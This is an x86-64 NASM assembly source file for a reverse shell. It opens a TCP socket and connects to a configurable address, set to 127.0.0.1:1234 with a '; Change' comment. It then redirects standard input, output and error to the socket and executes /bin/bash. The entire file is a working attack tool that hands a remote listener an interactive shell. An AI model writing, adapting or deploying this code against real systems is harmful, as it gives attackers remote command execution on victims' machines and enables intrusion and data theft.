default rel
global _start

%include "./src/ip_to_bin.asm"

%define AF_INET 2
%define EXIT 60
%define SOCKET 41
%define CONNECT 42
%define DUP2 33
%define SOCK_STREAM 1
%define EXECVE 59

section .text

_start:
    push rbp
    mov rbp, rsp
    sub rsp, 16

    mov bx, PORT
    xchg bh, bl ; PORT in bx

    lea rdi, [IP_ADDR]
    call ip_to_int ; IP in eax

    mov word  [rsp],   AF_INET
    mov word  [rsp+2], bx
    mov dword [rsp+4], eax
    mov dword [rsp+8], 0 ; padding

    mov rdi, AF_INET
    mov rsi, SOCK_STREAM
    mov rdx, 0
    mov rax, SOCKET
    syscall

    mov dword [s], eax

    mov rdi, [s]
    lea rsi, [rsp]
    mov rdx, 16
    mov rax, CONNECT
    syscall

    mov rdi, [s]
    mov rsi, 0
    mov rax, DUP2
    syscall

    mov rdi, [s]
    mov rsi, 1
    mov rax, DUP2
    syscall

    mov rdi, [s]
    mov rsi, 2
    mov rax, DUP2
    syscall

    lea rdi, [binary]
    lea rsi, [argv]
    xor rdx, rdx
    mov rax, EXECVE
    syscall

    leave
    xor rdi, rdi
    mov rax, EXIT
    syscall

section .data
s: dd 0
binary: db "/bin/bash", 0
argv: dq binary, 0

; Change
PORT: equ 1234
IP_ADDR: db "127.0.0.1", 0
